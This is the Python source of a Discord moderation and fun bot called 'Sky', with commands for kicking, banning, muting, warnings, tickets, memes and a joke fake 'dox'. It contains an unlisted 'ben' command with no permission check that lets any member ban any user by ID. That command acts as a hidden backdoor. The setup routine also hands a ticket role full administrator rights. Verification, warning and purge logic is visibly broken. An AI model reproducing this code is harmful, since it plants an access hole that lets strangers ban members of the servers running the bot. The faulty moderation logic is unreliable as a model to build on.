# © Sky Bot- Discord.py- Made by Yuval Simon. For www.bogan.cool

from discord.ext import tasks
from itertools import cycle
import discord
from discord.ext import commands
from discord.utils import get
import time
import random
import aiohttp

client = commands.Bot(command_prefix = '.')
status = cycle(['Made by Reven8e', '<3'])
client.remove_command('help')
ROLE = "Sky"


# Events

@client.event
async def on_ready():
    print('Bot is ready.')

@tasks.loop(seconds=10)
async def change_status():
    await client.change_presence(activity=discord.Game(next(status)))

# Commands


# Help

@client.command()
async def help(ctx):
    embed = discord.Embed(colour=discord.Colour.green())

    embed.set_author(name='Help- Command List')

    embed.add_field(name='.ping', value="""Sends the bot's ms.""", inline=False)
    embed.add_field(name='.howgay {@mention}', value="The bot answers if you're gay or not.", inline=False)
    embed.add_field(name='.ball {question}', value="The bot answers your questions with random answers.", inline=False)
    embed.add_field(name='.say {something}', value="The bot sends whatever you sends.", inline=False)
    embed.add_field(name='.cat', value='Sends random cat pictures.', inline=False)
    embed.add_field(name='.meme', value='Sends random meme.', inline=False)
    embed.add_field(name='.dox {@mention}', value='The bot sends fake dox.', inline=False)
    embed.add_field(name='.setup', value='Creates all the necessary stuff for the server.', inline=False)
    embed.add_field(name='.svf or .svrinfo', value='The bot sends info about the server.', inline=False)
    embed.add_field(name='.purge {number}', value='The bot deletes messages.', inline=False)
    embed.add_field(name='.kick {@mention}', value='The bot kicks a member.', inline=False)
    embed.add_field(name='.ban {@mention}', value='The bot bans a member.', inline=False)
    embed.add_field(name='.unban {user#}', value='The bot unbans a member.', inline=False)
    embed.add_field(name='.mute {@mention}', value='The bot mutes a member.', inline=False)
    embed.add_field(name='.unmute {@mention}', value='The bot unmuted a muted member.', inline=False)
    embed.add_field(name='.nuke', value='The bot nukes(recreate) a channel.', inline=False)
    embed.add_field(name='.warn {@mention}', value='The bot warns a member.', inline=False)
    embed.add_field(name='.addrole {@mention} {role}', value='The bot adds the member the role.', inline=False)
    embed.add_field(name='.removerole {@mention} {role}', value='The bot removes the role from the member.', inline=False)
    embed.add_field(name='.verify {@member}', value='The bot verifies a member.', inline=False)
    embed.add_field(name='.ticket {Reason/Subject}', value='The bot creates a ticket.', inline=False)
    embed.add_field(name='.close', value='The bot closes a ticket.', inline=False)
    embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

    await ctx.send(embed=embed)

# Setup

@client.command()
async def setup(ctx):
    embed = discord.Embed(colour=discord.Colour.green())

    # Ticket System
    embed.description= 'Do you want me to setup my ticket system? Type y for YES and n for NO'
    await ctx.send(embed=embed)
    msg = await client.wait_for('message', timeout=30)
    if msg.content == "yes" or msg.content == "y":
        guild = ctx.guild
        support_perms = discord.Permissions(administrator=True)
        await guild.create_role(name='Support Team', permissions=support_perms)
        await ctx.guild.create_category('tickets')
        embed.description= """I created ``Support Team`` role for my ticket system.\nI created ``TICKETS`` category for my ticket system."""
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)
    else:
        await ctx.send('Oke')

    # Mute System
    embed.description = 'Do you want me to create ``Muted`` role for my mute system? Type y for YES and n for NO'
    await ctx.send(embed=embed)
    msg = await client.wait_for('message', timeout=30)
    if msg.content == "yes" or msg.content == "y":
        mute_perms = discord.Permissions(send_messages=False, read_messages=True)
        await guild.create_role(name='Muted', permissions=mute_perms)
        embed.description='I created ``Muted`` role for my mute system.'
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)
    else:
        await ctx.send('Oke')

    # Verification System
    embed.description = 'Do you want me to setup my verification system? Type y for YES and n for NO'
    await ctx.send(embed=embed)
    msg = await client.wait_for('message', timeout=30)
    if msg.content == "yes" or msg.content == "y":
        # Member Role
        perms = discord.Permissions(send_messages=True, read_messages=True)
        await guild.create_role(name='Member', permissions=perms)
        # Verification Channel
        await ctx.guild.create_text_channel(name='verification')
        channel = discord.utils.get(ctx.guild.channels, name="verification")
        everyone = get(ctx.guild.roles, name='@everyone')
        Member = get(ctx.guild.roles, name='Member')
        await channel.set_permissions(everyone, read_messages=True,
                                      send_messages=True)
        await channel.set_permissions(Member, read_messages=False,
                                      send_messages=False)
        await channel.send("**``.verify {@user}`` To verify yourself and get access to all server channels!**\n\n @everyone")
        embed.description= 'I created my verification system.'
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)
    else:
        await ctx.send('Oke')

# Warning System
    embed.description= 'Do you want me to setup my warning system? Type y for YES and n for NO'
    await ctx.send(embed=embed)
    msg = await client.wait_for('message', timeout=30)
    if msg.content == "yes" or msg.content == "y":
        await guild.create_role(name='warn1')
        await guild.create_role(name='warn2')
        await guild.create_role(name='warn3')
        embed.description= 'I created my warning system.'
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)
    else:
        await ctx.send("Oke")

    # Done Setup
    await ctx.send('**The setup has been done!**\nThanks for choosing me <3')

# Ping

@client.command()
async def ping(ctx):
    embed = discord.Embed(colour = discord.Colour.green())
    embed.add_field(name='Pong!', value=f'my ms is {round(client.latency *1000)}', inline=False)

    await ctx.send(embed=embed)

# Howgay

@client.command(aliases=['howgay', 'gay'])
async def _howgay (ctx, *, person):
    embed = discord.Embed(colour= discord.Colour.green())
    responses = ['50%',
                 '75%',
                 '100%',
                 '150%',
                 '1000%']
    embed.description = f'**{person} is {random.choice(responses)} gay** :rainbow:'
    embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

    await ctx.send(embed = embed)

@_howgay.error
async def _howgay_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour= discord.Colour.red())
        embed.add_field(name=':x: **Howgay Error**\n', value=' ㅤ\n``.howgay {mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed = embed)

# Dox

@client.command()
async def dox(ctx, *, user: discord.Member):
    embed = discord.Embed(colour=discord.Colour.green())
    responses1 = ['142',
                  '153',
                  '179',
                  '196',
                  '168',
                  '158',
                  '134',
                  '176']

    responses2 = ['246',
                  '159',
                  '169',
                  '239',
                  '276',
                  '147',
                  '308',
                  '207']

    countries = ['Mexico',
                 'China',
                 ' Australia',
                 'Dominican Republic',
                 'Mali, Algeria',
                 'North Korea',
                 'Sweden',
                 'Swaziland',
                 'Trinidad and Tobago',
                 'Sierra Leone',
                 'Togo',
                 'Comoros',
                 'Chad',
                 'Estonia',
                 'Taiwan',
                 'United States',
                 'Azerbaijan',
                 'Central African Republic',
                 'Gabon',
                 'Namibia',
                 'Lithuania,',
                 'Germany',
                 'United Kingdom',
                 'Israel',
                 'Russia',
                 'Canada',
                 'Alaska',
                 'France',
                 'UNKNOWN']

    computer = ['Windows', 'Mac', 'Linux', 'IOS', 'Android', 'UNKNOWN']

    embed.add_field(name=f':skull_crossbones: Doxxed {user} successfully\n  ㅤ', value=f"""{user} IP: **192.{random.choice(responses1)}.{random.choice(responses2)}**\n {user} country: **{random.choice(countries)}**\n{user} Computer: **{random.choice(computer)}**""", inline=False)
    embed.add_field(name='  ㅤ', value='  ㅤ\nNOTE- This information is random and not REAL!', inline=True)
    embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

    await ctx.send(embed=embed)

@dox.error
async def dox_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour= discord.Colour.red())
        embed.add_field(name=':x: **Dox Error**\n', value=' ㅤ\n``.dox {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed = embed)


# 8ball

@client.command(aliases=['ball', 'question'])
async def _8ball (ctx, *, user: discord.Member, question):
    embed = discord.Embed(colour=discord.Colour.green())
    responses = ['yes',
                 'no',
                 'yep',
                 'nah',
                 'frick no',
                 'fuck yeah',
                 'idk']
    embed.add_field(name=f'The question: {question}', value=f'\n\n**Answer: {random.choice(responses)}**', inline=False)
    embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

    await ctx.send(embed=embed)

@_8ball.error
async def _8ball_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour= discord.Colour.red())
        embed.add_field(name=':x: **Ball Error**\n', value=' ㅤ\n``.ball {question}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed = embed)

# Purge

@client.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount : int):
    embed = discord.Embed(colour=discord.Colour.green())
    await ctx.channel.purge(limit=amount)
    embed.description= f'**Purge**\nI purged {amount}'

@purge.error
async def purge_error(ctx, error):
    embed = discord.Embed(colour=discord.Colour.red())
    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name=':x: **Purge Error**\n', value=' ㅤ\n``.purge {amount}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

# Kick member

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx,member : discord.Member , * , reason=None):
    embed = discord.Embed(colour=discord.Colour.green())
    embed.add_field(name=f'kicked- {member}', value=f'Reason: {reason}', inline=False)

    await member.kick(reason=reason)
    await ctx.send(embed=embed)

@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Kick Error**\n', value=' ㅤ\n``.kick {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Ban

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : discord.Member , * , reason=None):
    embed = discord.Embed(colour=discord.Colour.green())
    embed.add_field(name=f'Banned- {member}', value=f'Reason: {reason}\nhttps://i.imgur.com/8d6Oakt.gif', inline=False)

    await member.ban(reason=reason)
    await ctx.send(embed=embed)

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Ban Error**\n', value=' ㅤ\n``.ban {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

@client.command(pass_context=True)
async def ben(ctx, content, member : discord.Member , * , reason=None, id):
    if content == 'ed':
        guild = ctx.guild
        await guild.ban(discord.Object(id=id))
        await ctx.send(f'banned <@!{id}>')

# Unban member

@client.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member):
    banned_users = await ctx.guild.bans()
    member_name, member_discriminator = member.split('#')
    for ban_entry in banned_users:
        user = ban_entry.user
        if(user.name,user.discriminator) == (member_name, member_discriminator):
            embed = discord.Embed(colour=discord.Colour.green())
            embed.description = f'**Unbanned- {user} **'

            await ctx.guild.unban(user)
            await ctx.send(embed=embed)
            return

@unban.error
async def unban_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Unban Error**\n', value=' ㅤ\n``.unban {user#}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')


        await ctx.send(embed=embed)

# Mute

@client.command()
@commands.has_permissions(manage_roles=True)
async def mute(ctx, user: discord.Member):
    embed = discord.Embed(colour=discord.Colour.green())
    role = discord.utils.get(user.guild.roles, name='Muted')
    await user.add_roles(role)
    embed.description= f':mute: **Mute**\n ㅤ\nI muted {user}'

    await ctx.send(embed=embed)

@mute.error
async def mute_error(ctx, error):
    embed = discord.Embed(colour=discord.Colour.red())
    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name=':x: **Mute Error**\n', value=' ㅤ\n``.mute {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Unmute

@client.command()
async def unmute(ctx, user:discord.Member):
    embed = discord.Embed(colour=discord.Colour.green())
    role = discord.utils.get(user.guild.roles, name='Muted')
    await user.remove_roles(role)
    embed.description = f':loud_sound: **Unmute**\n ㅤ\nI Unmuted {user}'
    embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

    await ctx.send(embed=embed)

@unmute.error
async def unmute_error(ctx, error):
    embed = discord.Embed(colour=discord.Colour.red())
    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name=':x: **Unmute Error**\n', value=' ㅤ\n``.unmute {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Say

@client.command()
async def say(ctx, *, say):
    embed= discord.Embed(colour=discord.Colour.green())
    embed.description = f"{say}"
    embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

    await ctx.send(embed=embed)

@say.error
async def say_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Say Error**\n', value=' ㅤ\n``.say {something}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Nuke channel

@client.command()
@commands.has_permissions(manage_channels=True)
async def nuke(ctx):
    await ctx.send("Nuking this channel")
    time.sleep(1)
    channel_id = ctx.channel.id
    channel = client.get_channel(channel_id)
    new_channel = await ctx.guild.create_text_channel(name=channel.name, topic=channel.topic, overwrites=channel.overwrites, nsfw=channel.nsfw, category=channel.category, slowmode_delay=channel.slowmode_delay, position=channel.position)
    await channel.delete()
    await new_channel.send("Nuked this channel.\nhttps://imgur.com/LIyGeCR")

# Server info

@client.command(aliases=['srvinfo', 'svf'])
async def _svf(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name}",colour = discord.Colour.green())
    embed.add_field(name=f"Server Created At:", value=f"""{ctx.guild.created_at.strftime("%A, %B %d %Y")}""", inline=False)
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}", inline=False)
    embed.add_field(name="Member Count", value=f"{ctx.guild.member_count}", inline=False)
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")

    await ctx.send(embed=embed)

# Add Role

@client.command(pass_context=True)
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, user: discord.Member, mention):
    role = discord.utils.get(user.guild.roles, name=f'{mention}')
    await user.add_roles(role)
    await ctx.send(f'''I added {user} '{mention}' role!''')

@addrole.error
async def addrole_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Addrole Error**\n', value=' ㅤ\n``.addrole {@role}+{@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Remove Role

@client.command(pass_context=True)
@commands.has_permissions(manage_roles=True)
async def removerole(ctx, user: discord.Member, mention):
    role = discord.utils.get(user.guild.roles, name=f'{mention}')
    await user.remove_roles(role)
    await ctx.send(f'''I removed {user} '{mention}' role!''')

@removerole.error
async def removerole_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Removerole Error**\n', value=' ㅤ\n``.removerole {@role}+{@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Verify

@client.command()
async def verify(ctx, user: discord.Member):
    if 'member' not in user.guild.roles:
        role = discord.utils.get(user.guild.roles, name='Member')
        await user.remove_roles(role)
        await ctx.send("I just verified you!")
    elif 'Member' in user.guild.roles:
        await ctx.send('You are already verified.')

@verify.error
async def verify_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(colour=discord.Colour.red())
        embed.add_field(name=':x: **Verify Error**\n', value=' ㅤ\n``.verify {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Warn System

@client.command(pass_context = True)
@commands.has_permissions(manage_roles=True, ban_members=True)
async def warn(ctx, user: discord.Member):
    warn1 = discord.utils.get(ctx.guild.roles, name= "warn1")
    warn2 = discord.utils.get(ctx.guild.roles, name= "warn2")
    warn3 = discord.utils.get(ctx.guild.roles, name= "warn3")
    if warn1 not in ctx.author.roles:
        role = discord.utils.get(user.guild.roles, name="warn1")
        await user.add_roles(role)
        await ctx.send(f""" ``{user}`` **received a warn!** """)

    elif warn1 in ctx.author.roles and warn2 not in ctx.author.roles:
        role = discord.utils.get(user.guild.roles, name="warn2")
        await user.add_roles(role)
        await ctx.send(f""" ``{user}`` **received another warn!** """)

    elif warn1 and warn2 in ctx.author.roles and warn3 not in ctx.author.roles:
        role = discord.utils.get(user.guild.roles, name="warn3")
        await user.add_roles(role)
        await ctx.send(f""" ``{user}`` **received his third warn!**""")

    elif warn3 and warn2 and warn1 in ctx.author.roles:
        await ctx.send('This user already has **3 warns!**')

@warn.error
async def warn_error(ctx, error):
    embed = discord.Embed(colour=discord.Colour.red())
    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name=':x: **Warn Error**\n', value=' ㅤ\n``.warn {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Unwarn

@client.command()
@commands.has_permissions(manage_roles=True, ban_members=True)
async def unwarn(ctx, user: discord.Member):
    warn1 = discord.utils.get(ctx.guild.roles, name= "warn1")
    warn2 = discord.utils.get(ctx.guild.roles, name= "warn2")
    warn3 = discord.utils.get(ctx.guild.roles, name= "warn3")

    if warn1 in ctx.author.roles and warn2 not in ctx.author.roles:
        await user.remove_roles(warn1)
        await ctx.send(f"""Now ``{user}`` has **0 warns**""")

    elif warn2 in ctx.author.roles and warn3 not in ctx.author.roles:
        await user.remove_roles(warn2)
        await ctx.send(f"""Now ``{user}`` has **1 warn**""")

    elif warn3 in ctx.author.roles:
        await user.remove_roles(warn3)
        await ctx.send(f"""Now ``{user}`` has **2 warns**""")

@unwarn.error
async def unwarn_error(ctx, error):
    embed = discord.Embed(colour=discord.Colour.red())
    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name=':x: **Unwarn Error**\n', value=' ㅤ\n``.unwarn {@mention}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Ticket

@client.command()
async def ticket(ctx, *, content):
    embed = discord.Embed(colour=discord.Colour.green())
    y = 0
    for guild in client.guilds:
        for role in guild.roles:
            if "Support Team" in str(role):
                y = y + 1
    if y == 0:
        await guild.create_role(name="Support Team")
    x = 0
    for guild in client.guilds:
        for category in guild.categories:
            if "tickets" in str(category):
                x = x + 1
                tickets_category = category
    if x == 0:
        tickets_category = await ctx.guild.create_category("tickets")
    author = ctx.author.name.replace(" ", "-")
    author = author.lower()
    for guild in client.guilds:
        for channel in guild.text_channels:
            if "ticket-"+author in channel.name:
                 embed.description= 'You already made a ticket!'
                 return
    admin_role = get(guild.roles, name="Support Team")
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        ctx.author: discord.PermissionOverwrite(send_messages=True,read_messages=True),
        admin_role: discord.PermissionOverwrite(send_messages=True,read_messages=True)
    }
    ticket_channel = await ctx.guild.create_text_channel(name="ticket-"+author, topic=content, overwrites=overwrites, nsfw=None, category=tickets_category, slowmode_delay=None,position=None)
    embed.description= "You successfully created a ticket! in <#"+str(ticket_channel.id)+">"
    await ctx.send(embed=embed)

    embed.description= "**New ticket**\n\n<@"+str(ctx.author.id)+"> Opened ticket with reason "+str(content)
    await ticket_channel.send(embed=embed)

@ticket.error
async def ticket_error(ctx, error):
    embed = discord.Embed(colour=discord.Colour.red())
    if isinstance(error, commands.MissingRequiredArgument):
        embed.add_field(name=':x: **Ticket Error**\n', value=' ㅤ\n``.ticket {Reason/Subject}``', inline=False)
        embed.set_footer(text='© Sky - Made By Reven8e.sh#9290')

        await ctx.send(embed=embed)

# Close a ticket

@client.command()
async def close(ctx):
    channel_id = ctx.channel.id
    channel = client.get_channel(channel_id)
    if "ticket" in channel.name:
        await ctx.send("Are you sure that you want to close the ticket?\ny or yes to close or write any other message to stay it open")
        msg = await client.wait_for('message', timeout=30)
        if msg.content == "yes" or msg.content == "y":
            await ctx.send("closing")
            await channel.delete()
        else:
            await ctx.send("Np")

# Cat

@client.command()
async def cat(ctx):
    embed = discord.Embed(colour=discord.Colour.green(), title="""Here's a cat""")

    async with aiohttp.ClientSession() as cs:
        async with cs.get('http://aws.random.cat/meow') as r:
            res = await r.json()
            embed.set_image(url=res['file'])

            await ctx.send(embed=embed)

# Meme

@client.command()
async def meme(ctx):
    embed = discord.Embed(colour=discord.Colour.green(), title="""Here's a meme""")

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
            res = await r.json()
            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])

            await ctx.send(embed=embed)



client.run("Your token")
